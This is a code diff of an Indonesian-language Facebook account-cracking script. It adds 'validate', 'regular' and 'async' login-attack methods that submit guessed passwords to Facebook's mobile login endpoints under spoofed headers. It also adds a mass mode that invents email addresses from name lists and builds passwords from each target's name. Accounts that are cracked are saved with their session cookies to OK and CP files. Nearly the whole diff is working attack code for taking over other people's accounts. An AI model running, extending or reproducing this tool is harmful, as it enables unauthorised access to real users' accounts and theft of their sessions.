@@ -110,10 +110,9 @@ class MAINmenu:
 		tree = Tree(Panel.fit(f"[red]WELCOME, [green]{nama}",style=f"white"))
 		tree.add(Panel.fit(f"[white]author : [green]Lia Zuckerberg",style=f"white"))
 		vprint(tree)
-		anj = []
-		anjv = []
+		anj, anjv = [] , []
 		anj.append(Panel(f"[white]a. crack for public\n[white]b. crack for massal",width=35,style=f"white"))
-		anj.append(Panel(f"[white]c. crack for mail [red]off\n[white]d. nuyul dump 1 id",width=35,style=f"white"))
+		anj.append(Panel(f"[white]c. crack for mail \n[white]d. nuyul dump 1 id",width=35,style=f"white"))
 		anjv.append(Panel(f"\t\t      [yellow]L[white]. logout script\n\t\t      [red]D[white]. delete cookies",width=71,style=f"white"))
 		console.print(columns(anj))
 		console.print(columns(anjv))
@@ -162,6 +161,16 @@ class MAINmenu:
 		for kntl in ids:
 			xx = random.randint(0,len(ids2))
 			ids2.insert(xx,kntl)
+		anj, anjv = [] , []
+		anj.append(Panel(f"[white]a. method [green][bold]validate",width=35,style=f"white"))
+		anj.append(Panel(f"[white]b. method [yellow][bold]regular",width=35,style=f"white"))
+		anjv.append(Panel(f"\t\t      c. method [red][bold]async",width=71,style=f"white"))
+		console.print(columns(anj))
+		console.print(columns(anjv))
+		mettod = input(f"{shit} choose : ")
+		if mettod in ["a"]:metode.append("validate")
+		elif mettod in ["b"]:metode.append("regular")
+		else:metode.append("async")
 		meki = input(f"{shit} apakah anda ingin menambahkan password {h}y{p}/{k}t{p} : ")
 		if meki in ["y","Y"]:
 			tampass.append("tambahkan")
@@ -176,8 +185,7 @@ class MAINmenu:
 		self.Langsung()
 	''' mulai crack/setting password wordlist '''
 	def Langsung(self):
-		anj = []
-		anjv = []
+		anj, anjv = [] , []
 		anj.append(Panel(f"[green]hasil crack ok tersimpan di Ok/{okZ}",width=35,style=f"white"))
 		anj.append(Panel(f"[yellow]hasil crack cp tersimpan di Cp/{cpZ}",width=35,style=f"white"))
 		anjv.append(Panel(f"[cyan]\t\tjangan lupa mainkan modpes pas 200 id!! ",width=71,style=f"white"))
@@ -233,9 +241,13 @@ class MAINmenu:
 						if "tambahkan" in tampass:
 							for ajg in pwlu:pwr.append(ajg)
 						else:pass
-						HikmatXD.submit(self.Valid,uiz,pwr)
+						if "async" in metode:HikmatXD.submit(self.Async,uiz,pwr)
+						elif "regular" in metode:HikmatXD.submit(self.Regular,uiz,pwr)
+						else:HikmatXD.submit(self.Valid,uiz,pwr)
 					except:
-						HikmatXD.submit(self.Valid,uiz,pwr)
+						if "async" in metode:HikmatXD.submit(self.Async,uiz,pwr)
+						elif "regular" in metode:HikmatXD.submit(self.Regular,uiz,pwr)
+						else:HikmatXD.submit(self.Valid,uiz,pwr)
 		print()
 		if ok != 0 or cp != 0:
 			anj = []
@@ -295,7 +307,7 @@ class MAINmenu:
 		global ok, cp, loops
 		rr, rc, ses, wwb = random.randint, random.choice, requests.Session(), random.choice([h,k,o,b,u,a])
 		Inlocale, Locale= rc(["vi-VN,vi;q=0.9","ar-AR,ar;q=0.9","bg-BG,bg;q=0.9","bs-BA,bs;q=0.9","ca-ES,ca;q=0.9","da-DK,da;q=0.9","el-GR,el;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","es-LA,es;q=0.9","es-ES,es;q=0.9","fa-IR,fa;q=0.9","fi-FI,fi;q=0.9","fr-FR,fr;q=0.9","hi-IN,hi;q=0.9","hr-HR,hr;q=0.9","fr-CA,fr;q=0.9","id-ID,id;q=0.9","it-IT,it;q=0.9","ko-KR,ko;q=0.9","mk-MK,mk;q=0.9","ms-MY,ms;q=0.9","pl-PL,pl;q=0.9","pt-BR,pt;q=0.9","pt-PT,pt;q=0.9","ro-RO,ro;q=0.9","sl-SL,sl;q=0.9","sr-RS,sr;q=0.9","th-TH,th;q=0.9"]), rc(["jv_ID","id_ID","en_US"])
-		Pukimak.update(Ireng,description=f"{m} • {wwb}{uiz}{p} {loops}/{str(len(ids or ids2))} {h}ok:{ok} {k}cp:{cp}{p} ")
+		Pukimak.update(Ireng,description=f"{wwb} • {o}LiaXR{p} {loops}/{str(len(ids or ids2))} {h}ok:{ok} {k}cp:{cp}{p} ")
 		Pukimak.advance(Ireng)
 		MozillaAgent = self.Mozilla(uiz)
 		dataku, headersku = {}, {}
@@ -356,6 +368,166 @@ class MAINmenu:
 										"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 				})
 				ses.post(f"https://{Hostt}/login/device-based/validate-password/?shbl=0",data = dataku, cookies = {"cookie": kueh}, headers = headersku, allow_redirects = False)
+				if "checkpoint" in ses.cookies.get_dict().keys():
+					cp+=1
+					tree = Tree(Panel.fit(f"[red] ACCOUNT [yellow]CHECKPOINT ",style=f"white"))
+					tree.add(Panel.fit(f"[yellow] {uiz} | {pw} ",style=f"white")).add(Panel.fit(f"[cyan]{______BUJANK______(uiz)} "))
+					tree.add(Panel.fit(f"[yellow]{MozillaAgent}",style=f"white"))
+					vprint(tree)
+					open("CP/"+cpZ,"a").write(uiz+"|"+pw+"\n")
+					break
+				elif "c_user" in ses.cookies.get_dict().keys():
+					ok+=1
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open("OK/"+okZ,"a").write(uiz+"|"+pw+"|"+kuki+"\n")
+					self.Ingfo(kuki,uiz,pw,MozillaAgent)
+					self.YaSekedarMengingatkan(kuki)
+					break
+				else:continue
+			except requests.exceptions.ConnectionError:turu(31)
+		loops+=1
+	def Regular(self,uiz,pwr):
+		global ok, cp, loops
+		rr, rc, ses, wwb = random.randint, random.choice, requests.Session(), random.choice([h,k,o,b,u,a])
+		Inlocale, Locale= rc(["vi-VN,vi;q=0.9","ar-AR,ar;q=0.9","bg-BG,bg;q=0.9","bs-BA,bs;q=0.9","ca-ES,ca;q=0.9","da-DK,da;q=0.9","el-GR,el;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","es-LA,es;q=0.9","es-ES,es;q=0.9","fa-IR,fa;q=0.9","fi-FI,fi;q=0.9","fr-FR,fr;q=0.9","hi-IN,hi;q=0.9","hr-HR,hr;q=0.9","fr-CA,fr;q=0.9","id-ID,id;q=0.9","it-IT,it;q=0.9","ko-KR,ko;q=0.9","mk-MK,mk;q=0.9","ms-MY,ms;q=0.9","pl-PL,pl;q=0.9","pt-BR,pt;q=0.9","pt-PT,pt;q=0.9","ro-RO,ro;q=0.9","sl-SL,sl;q=0.9","sr-RS,sr;q=0.9","th-TH,th;q=0.9"]), rc(["jv_ID","id_ID","en_US"])
+		Pukimak.update(Ireng,description=f"{wwb} • {o}LiaXR{p} {loops}/{str(len(ids or ids2))} {h}ok:{ok} {k}cp:{cp}{p} ")
+		Pukimak.advance(Ireng)
+		MozillaAgent = self.Mozilla(uiz)
+		dataku, headersku = {}, {}
+		coyy = re.search('Chrome/(.*?)',str(MozillaAgent)).group(1)
+		Hostt = "mbasic.facebook.com"
+		for pw in pwr:
+			pw = pw.lower()
+			try:
+				Memek = ses.get(f"https://{Hostt}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
+				dataku.update({
+										"lsd": re.search('name="lsd" value="(.*?)"',str(Memek.text)).group(1),
+										"jazoest": re.search('name="jazoest" value="(.*?)"',str(Memek.text)).group(1),
+										"m_ts": re.search('name="m_ts" value="(.*?)"',str(Memek.text)).group(1),
+										"li": re.search('name="li" value="(.*?)"',str(Memek.text)).group(1),
+										"try_number": "0",
+										"unrecognized_tries": "0",
+										"email": uiz,
+										"pass": pw,
+										"login": "Masuk",
+										"bi_xrwh": "0"
+				})
+				kueh = (";").join([ "%s=%s" % (key, value) for key, value in Memek.cookies.get_dict().items() ])
+				kueh+=' m_pixel_ratio=2.625; wd=412x756'
+				headersku.update({
+										"Host": Hostt,
+										"content-length": str(rr(100,200)),
+										"cache-control": "max-age=0",
+										"dpr": "2",
+										"viewport-width": "980",
+										"sec-ch-prefers-color-scheme": "light",
+										"upgrade-insecure-requests": "1",
+										"origin": f"https://{Hostt}",
+										"content-type": "application/x-www-form-urlencoded",
+										"user-agent": MozillaAgent,
+										"x-requested-with": "mark.via.gp",
+										"sec-fetch-site": "same-origin",
+										"sec-fetch-mode": "navigate",
+										"sec-fetch-user": "?1",
+										"sec-fetch-dest": "document",
+										"referer": f"https://{Hostt}/login/?li=YA0wZULBFo7mSM_ikfkKZQX3&e=1348029&shbl=1&ref=dbl&wtsid=rdr_0k6dVBRedNncGJ0fQ&refsrc=deprecated&ref_component=mbasic_footer&_rdr?",
+										"accept-encoding": "gzip, deflate, br",
+										"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				})
+				ses.post(f"https://{Hostt}//login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl&locale=id_ID",data = dataku, cookies = {"cookie": kueh}, headers = headersku, allow_redirects = False)
+				if "checkpoint" in ses.cookies.get_dict().keys():
+					cp+=1
+					tree = Tree(Panel.fit(f"[red] ACCOUNT [yellow]CHECKPOINT ",style=f"white"))
+					tree.add(Panel.fit(f"[yellow] {uiz} | {pw} ",style=f"white")).add(Panel.fit(f"[cyan]{______BUJANK______(uiz)} "))
+					tree.add(Panel.fit(f"[yellow]{MozillaAgent}",style=f"white"))
+					vprint(tree)
+					open("CP/"+cpZ,"a").write(uiz+"|"+pw+"\n")
+					break
+				elif "c_user" in ses.cookies.get_dict().keys():
+					ok+=1
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open("OK/"+okZ,"a").write(uiz+"|"+pw+"|"+kuki+"\n")
+					self.Ingfo(kuki,uiz,pw,MozillaAgent)
+					self.YaSekedarMengingatkan(kuki)
+					break
+				else:continue
+			except requests.exceptions.ConnectionError:turu(31)
+		loops+=1
+	def Async(self,uiz,pwr):
+		global ok, cp, loops
+		rr, rc, ses, wwb = random.randint, random.choice, requests.Session(), random.choice([h,k,o,b,u,a])
+		Inlocale, Locale= rc(["vi-VN,vi;q=0.9","ar-AR,ar;q=0.9","bg-BG,bg;q=0.9","bs-BA,bs;q=0.9","ca-ES,ca;q=0.9","da-DK,da;q=0.9","el-GR,el;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","es-LA,es;q=0.9","es-ES,es;q=0.9","fa-IR,fa;q=0.9","fi-FI,fi;q=0.9","fr-FR,fr;q=0.9","hi-IN,hi;q=0.9","hr-HR,hr;q=0.9","fr-CA,fr;q=0.9","id-ID,id;q=0.9","it-IT,it;q=0.9","ko-KR,ko;q=0.9","mk-MK,mk;q=0.9","ms-MY,ms;q=0.9","pl-PL,pl;q=0.9","pt-BR,pt;q=0.9","pt-PT,pt;q=0.9","ro-RO,ro;q=0.9","sl-SL,sl;q=0.9","sr-RS,sr;q=0.9","th-TH,th;q=0.9"]), rc(["jv_ID","id_ID","en_US"])
+		Pukimak.update(Ireng,description=f"{wwb} •{o} LiaXR{p} {loops}/{str(len(ids or ids2))} {h}ok:{ok} {k}cp:{cp}{p} ")
+		Pukimak.advance(Ireng)
+		MozillaAgent = self.Mozilla(uiz)
+		dataku, headersku = {}, {}
+		coyy = re.search('Chrome/(.*?)',str(MozillaAgent)).group(1)
+		Hostt = "m.facebook.com"
+		for pw in pwr:
+			pw = pw.lower()
+			try:
+				Memek = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=480279740868320&kid_directed_site=0&app_id=480279740868320&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D480279740868320%26redirect_uri%3Dhttps%253A%252F%252Fid.reedpop.com%252Fauth%252Fsocial%252Fcomplete%252Ffacebook%252F%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%26return_scopes%3Dtrue%26scope%3Demail%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1a4e686-9b94-4d43-adc8-fffb93ec69c6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+				dataku.update({
+										"lsd": re.search('name="lsd" value="(.*?)"',str(Memek.text)).group(1),
+										"jazoest": re.search('name="jazoest" value="(.*?)"',str(Memek.text)).group(1),
+										"m_ts": re.search('name="m_ts" value="(.*?)"',str(Memek.text)).group(1),
+										"li": re.search('name="li" value="(.*?)"',str(Memek.text)).group(1),
+										"try_number": 0,
+										"unrecognized_tries": 0,
+										"email": uiz,
+										"pass": pw,
+										"login": "Masuk",
+										"prefill_contact_point": "",
+										"prefill_source": "",
+										"prefill_type": "",
+										"first_prefill_source": "",
+										"first_prefill_type": "",
+										"had_cp_prefilled": True,
+										"had_password_prefilled": True,
+										"is_smart_lock": False,
+										"bi_xrwh": 0
+				})
+				headersku.update({
+										"Host": Hostt,
+										"content-length": str(rr(2100,2200)),
+										"viewport-width": "471",
+										"x-fb-rlafr": "0",
+										"access-control-allow-origin": "*",
+										"strict-transport-security": "max-age=15552000; preload",
+										"pragma": "no-cache",
+										"cache-control": "private, no-cache, no-store, must-revalidate",
+										"x-fb-debug": "twOzrZymG6+gbsXjXO1c1VqT7bocpIgVbW7dMoAdT2rysv6l5/p6I0PzbbkZiWIu7V8g1IP1EvPxVdKhFSZACw==",
+										"content-length": "0",
+										"cache-control": "max-age=0",
+										"sec-ch-ua": '"Not A;Brand";v="98", "Chromium";v="99"',
+										"sec-ch-ua-mobile": "?1",
+										"sec-ch-ua-platform": '"Android"',
+										"save-data": "on",
+										"upgrade-insecure-requests": "1",
+										"origin": "https://m.facebook.com",
+										"content-type": "application/x-www-form-urlencoded",
+										"user-agent": MozillaAgent,
+										"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+										"sec-fetch-site": "same-origin",
+										"sec-fetch-mode": "cors",
+										"sec-fetch-user": "?1",
+										"sec-fetch-dest": "empty",
+										"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=480279740868320&kid_directed_site=0&app_id=480279740868320&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D480279740868320%26redirect_uri%3Dhttps%253A%252F%252Fid.reedpop.com%252Fauth%252Fsocial%252Fcomplete%252Ffacebook%252F%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%26return_scopes%3Dtrue%26scope%3Demail%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1a4e686-9b94-4d43-adc8-fffb93ec69c6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+										"accept-encoding": "gzip, deflate",
+										"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-GB;q=0.7,en;q=0.6"
+				})
+				params = {
+										"api_key": "480279740868320",
+										"auth_token": "da6b587c34f1968747ae30611b0c4789",
+										"skip_api_login": "1",
+										"signed_next": "1",
+										"next": "https://m.facebook.com/v12.0/dialog/oauth?client_id=480279740868320&redirect_uri=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F&state=G72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O&return_scopes=true&scope=email&auth_type=rerequest&ret=login&fbapp_pres=0&logger_id=b1a4e686-9b94-4d43-adc8-fffb93ec69c6&tp=unspecified",
+										"refsrc": "deprecated",
+										"app_id": "480279740868320",
+										"cancel": "https://id.reedpop.com/auth/social/complete/facebook/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=G72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O#_=_",
+										"lwv": "100"
+				}
+				ses.post(f"https://m.facebook.com/login/device-based/login/async/?api_key=480279740868320&auth_token=da6b587c34f1968747ae30611b0c4789&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D480279740868320%26redirect_uri%3Dhttps%253A%252F%252Fid.reedpop.com%252Fauth%252Fsocial%252Fcomplete%252Ffacebook%252F%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%26return_scopes%3Dtrue%26scope%3Demail%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1a4e686-9b94-4d43-adc8-fffb93ec69c6%26tp%3Dunspecified&refsrc=deprecated&app_id=480279740868320&cancel=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%23_%3D_&lwv=100",data = dataku, headers = headersku, params = params, allow_redirects = False)
 				if "checkpoint" in ses.cookies.get_dict().keys():
 					cp+=1
 					tree = Tree(Panel.fit(f"[red] ACCOUNT [yellow]CHECKPOINT ",style=f"white"))
@@ -442,26 +614,44 @@ class MAINmenu:
 		vprint(tree)
 	''' crack mail '''
 	def KrekMail(self):
-		harep = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','zaki','zuleha','tina']
-		tukang = ['99','official','gaming','utama','cakep','cantik','sayang','ganteng']
-		nama = input(f"\n{shit} nama target : ")
+		harep = ["andi","dwi","muhammad","nur","dewi","tri","dian","sri","putri","eka","sari","aditya","basuki","budi","joni","toni","cahya","riski","farhan","aden","joko","zaki","zuleha","tina","semarang","boyolali", "cilacap","kebumen","banyumas","tuban","sumedang","sragen","sunda","garut","cirebon","sukabumi","medan","suroboyo","surabaya","cilacap","jepara","tasik","malang","jogja","kediri","kudus","jember","situbondo","pemalang","wonosobo","trenggalek","tuban","gresik","bangkalan","jombang","kediri","lamongan","lumajang","madiun","magetan","mojokerto","nganjuk","pacitan","ngawi","pasuruan","ponorogo","pamengkasan","sidoarjo","tuban","blitar","kediri","banjarnegara","batang","blora","brebes","grobokan","karanganyar","kendal","klaten","kudus","pati","pekalongan","rembang","sragen","tegal","temanggung","wonogiri","wonosobo","sukoharjo","salatiga","bandung","ciamis","cianjur","cirebon","indramayu","majalengka","subang","sumedang","purwakarta","banjar","bekasi","bogor","comahi","depok","tasikmalaya","wahyu","firman","dinda","revalda","rendi","aril","zilong","miyabi","parno","dika","rahma","andika","dwi","candrut","agus","januari","februari","maret","april","aprilia","rusmi","wiwik","adinda","riska","wati","susilo","mei","juni","juli","agustus","september","oktober","november","desember"]
+		tukang = ["99","official","gaming","utama","cakep","cantik","sayang","ganteng"]
+		nama = input(f"{shit} nama target : ")
 		if ',' in str(nama):
 			print(f"{shit} masukan 1 nama saja.. ");exit()
-		doma = input(f"{shit} domain : ")
-		if '@' not in str(doma) or '.com' not in str(doma):
-			exit(f"{shit} masukan domain yang benar.. ")
+		anj = []
+		anj.append(Panel(f"[white]a. @gmail.com\n[white]b. @yahoo.com",width=35,style=f"white"))
+		anj.append(Panel(f"[white]c. @outlook.com\n[white]d. @yandek.com",width=35,style=f"white"))
+		console.print(columns(anj))
+		doma = input(f"{shit} choose : ")
+		if doma in ["a"]:doma = "@gmail.com"
+		elif doma in ["b"]:doma = "@yahoo.com"
+		elif doma in ["c"]:doma = "@outlook.com"
+		else:doma = "@yandek.com"
 		jumlah = input(f"{shit} total : ")
-		for xyz in range(int(jumlah)):
-			A = nama
-			B = [f'{str(rc(harep))}',f'{str(rr(0,31))}',f'{str(rc(tukang))}'f'{str(rc(harep))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(tukang))}{str(rr(0,31))}',f'{str(rc(harep))}{str(rc(tukang))}']
-			C = doma
-			D = f'{A}{str(rc(B))}{C}'
-			if D in ids:pass
-			else:ids.append(D+'|'+nama)
-			if len(ids)==2000:self.METHODsetting()
-			print(f"\r{shit} sedang dump {h}%s{p} id"%(len(ids)),end='')
-			sys.stdout.flush()
-		self.METHODsetting()
+		for oajfifjrinnk in range(int(jumlah)):
+			fulllist = [f'{str(rc(harep))}',f'{str(rr(0,31))}',f'{str(rc(tukang))}'f'{str(rc(harep))}{str(rr(0,31))}',f'{oajfifjrinnk}',f'{str(rc(tukang))}{str(rr(0,31))}',f'{str(rc(harep))}{str(rc(tukang))}']
+			hasillist = f'{nama}{str(rc(fulllist))}{doma}'
+			if hasillist in ids:pass
+			else:ids.append(hasillist+'|'+nama)
+			if len(ids)==99999:self.LangMail()
+		anjv = []
+		anjv.append(Panel(f"[white]\t\t       total id :[green] {len(ids)}",width=71,style=f"white"))
+		console.print(columns(anjv))
+		self.SettingMail()
+	''' setting mail '''
+	def SettingMail(self):
+		anj, anjv = [] , []
+		anj.append(Panel(f"[white]a. method [green][bold]regular",width=35,style=f"white"))
+		anj.append(Panel(f"[white]b. method [yellow][bold]async",width=35,style=f"white"))
+		anjv.append(Panel(f"\t\t      c. method [red][bold]validate",width=71,style=f"white"))
+		console.print(columns(anj))
+		console.print(columns(anjv))
+		mettod = input(f"{shit} choose : ")
+		if mettod in ["a"]:metode.append("regular")
+		elif mettod in ["b"]:metode.append("async")
+		else:metode.append("validate")
+		self.LangMail()
 	''' krek massal v.2 '''
 	def KrekMassal(self, kuki, token):
 		uid = []
@@ -488,6 +678,68 @@ class MAINmenu:
 				print(f"{shit} sinyal anda bermasalah.. ");exit()
 		print(f"{shit} total target id : {str(len(ids))} ")
 		self.METHODsetting()
+	''' mulai crack mail '''
+	def LangMail(self):
+		anj, anjv = [] , []
+		anj.append(Panel(f"[green]hasil crack ok tersimpan di Ok/{okZ}",width=35,style=f"white"))
+		anj.append(Panel(f"[yellow]hasil crack cp tersimpan di Cp/{cpZ}",width=35,style=f"white"))
+		anjv.append(Panel(f"[cyan]\t\tjangan lupa mainkan modpes pas 200 id!! ",width=71,style=f"white"))
+		console.print(columns(anj))
+		console.print(columns(anjv))
+		input(f"{shit} enter untuk memulai crack.. ")
+		print()
+		global Pukimak, Ireng
+		Pukimak = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+		Ireng = Pukimak.add_task('',total=len(ids))
+		with Pukimak:
+			with tread(max_workers=30) as HikmatXD:
+				for koncol in ids2 or ids:
+					try:
+						pwr = []
+						uiz = koncol.split("|")[0]
+						nama = koncol.split("|")[1]
+						depan = nama.split(" ")[0]
+						if len(nama)<6:
+							if len(depan)<3:pass
+							else:
+								pwr.append(nama)
+								pwr.append(depan+'01')
+								pwr.append(depan+'02')
+								pwr.append(depan+'03')
+								pwr.append(depan+'04')
+								pwr.append(depan+'05')
+								pwr.append(depan+'1234')
+								pwr.append(depan+'12345')
+								pwr.append(depan+'123456')
+						else:
+							if len(depan)<3:pwr.append(nama)
+							else:
+								pwr.append(nama)
+								pwr.append(depan+'12')
+								pwr.append(depan+'321')
+								pwr.append(depan+'123')
+								pwr.append(depan+'1234')
+								pwr.append(depan+'12345')
+								pwr.append(depan+'123456')
+						if "async" in metode:HikmatXD.submit(self.Async,uiz,pwr)
+						elif "regular" in metode:HikmatXD.submit(self.Regular,uiz,pwr)
+						else:HikmatXD.submit(self.Regular,uiz,pwr)
+					except:
+						if "async" in metode:HikmatXD.submit(self.Async,uiz,pwr)
+						elif "regular" in metode:HikmatXD.submit(self.Regular,uiz,pwr)
+						else:HikmatXD.submit(self.Regular,uiz,pwr)
+		print()
+		if ok != 0 or cp != 0:
+			anj = []
+			anj.append(Panel(f"[green]ress succes {ok}",width=35,style=f"white"))
+			anj.append(Panel(f"[yellow]ress checkpoint {cp}",width=35,style=f"white"))
+			console.print(columns(anj))
+			exit()
+		else:
+			anj = []
+			anj.append(Panel(f"[yellow]\t   ups.. kamu tidak mendapatkan hasil:( ",width=71,style=f"white"))
+			console.print(columns(anj))
+			exit()
 	'''convert cookies'''
 	def Convertt(self,cookie):
 		cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
@@ -520,8 +772,7 @@ class MAINmenu:
 		ka = requests.get('https://graph.facebook.com/%s'%(it),params = params,cookies = cookie).json()
 		for fuck in ka['friends']['data']:
 			tl.append(fuck['id'])
-		anj = []
-		anjv = []
+		anj, anjv = [] , []
 		anj.append(Panel(f"[white]a. dump id urutan new",width=35,style=f"white"))
 		anj.append(Panel(f"[white]b. dump id urutan old",width=35,style=f"white"))
 		anjv.append(Panel(f"\t\t      [white]c. dump id urutan acak",width=71,style=f"white"))
